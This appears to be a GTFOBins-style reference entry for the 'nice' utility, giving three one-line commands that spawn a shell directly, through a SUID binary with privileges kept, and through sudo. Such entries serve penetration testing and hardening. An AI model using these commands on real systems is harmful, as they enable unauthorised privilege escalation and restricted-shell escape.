---
functions:
  shell:
    - code: nice /bin/sh
  suid:
    - code: ./nice /bin/sh -p
  sudo:
    - code: sudo nice /bin/sh
---
